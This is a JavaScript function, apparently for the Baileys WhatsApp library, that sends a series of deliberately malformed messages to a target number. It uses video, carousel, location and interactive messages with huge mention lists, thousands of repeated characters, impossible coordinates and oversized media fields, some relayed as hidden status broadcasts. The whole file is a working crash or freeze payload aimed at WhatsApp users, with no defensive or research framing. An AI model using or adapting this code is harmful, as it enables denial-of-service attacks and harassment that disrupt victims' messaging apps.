async function VerloadXDelayFc(target) {
  try {
    const msg1 = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            videoMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
              mimetype: "video/mp4",
              fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
              fileLength: "999999",
              seconds: 999999,
              mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
              caption: "\u200D".repeat(1000),
              height: 999999,
              width: 999999,
              fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
              directPath:
                "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1743742853",
              contextInfo: {
                isSampled: true,
                mentionedJid: [
                  target,
                  "13135550002@s.whatsapp.net",
                  ...Array.from(
                    { length: 30000 },
                    () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                  ),
                ],
              },
              streamingSidecar:
                "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
              thumbnailDirectPath:
                "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
              thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
              thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
              annotations: [
                {
                  embeddedContent: {
                    embeddedMusic: {
                      musicContentMediaId: "kontol",
                      songId: "peler",
                      author: "\u9999",
                      title: "\u9999",
                      artworkDirectPath:
                        "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                      artworkSha256:
                        "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                      artworkEncSha256:
                        "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                      artistAttribution:
                        "https://www.instagram.com/_u/tamainfinity_",
                      countryBlocklist: true,
                      isExplicit: true,
                      artworkMediaKey:
                        "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ=",
                    },
                  },
                  embeddedAction: null,
                },
              ],
            },
          },
        },
      },
      {}
    );

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
            },
          ],
        },
      ],
    });

    if (mention) {
      await sock.relayMessage(
        target,
        {
          groupStatusMentionMessage: {
            message: { protocolMessage: { key: msg1.key, type: 25 } },
          },
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "true" },
              content: undefined,
            },
          ],
        }
      );
    }
    
    const space = "{".repeat(10000);

    const messagePayload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "VaxzyNotWhyy👀" },
            carouselMessage: {
              cards: cardsCrL,
              messageVersion: 1
            }
          }
        }
      }
    };
    
    const msg2 = generateWAMessageFromContent(target, messagePayload, {});

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target],
    });
    
    let message = {
      viewOnceMessage: {
        message: {
          locationMessage: {
            name: "Mode High On 😂",
            address: "Mode High On 😂",
            comment: "Mode High On 😂",
            accuracyInMeters: 1,
            degreesLatitude: 111.45231,
            degreesLongitude: 111.45231,
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 35000,
                  },
                  () =>
                    "628" +
                    Math.floor(Math.random() * 10000000000) +
                    "@s.whatsapp.net"
                ),
              ],
              forwardingScore: 999999,
              isForwarded: true,
            },
          },
        },
      },
    };

    const msg3 = generateWAMessageFromContent(target, message, {});

    let statusid;
    statusid = await sock.relayMessage("status@broadcast", msg3.message, {
      messageId: msg3.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });

    const messageVxzXinvis = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "VaxzyNotWhyy👀",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "VaxzyNotWhyy👀".repeat(10000),
                address: "ោ៝".repeat(10000),
              },
            },
            body: {
              text: "VaxzyNotWhyy👀",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, messageVxzXinvis, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });

    const messageVerloadXCall = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "ini vaxzy bego 😩",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "ini vaxzy bego 😩".repeat(10000),
                address: "ោ៝".repeat(10000),
              },
            },
            body: { 
              text: `ini vaxzy bego 😩${"꧀".repeat(2500)}.com - _ #`
            },
            nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, messageVerloadXCall, {
      participant: { jid: target },
    });
    } catch (err) {
    console.error("Terdapat Kesalahan Pada Struktur Function", err);
    throw err;
  }
}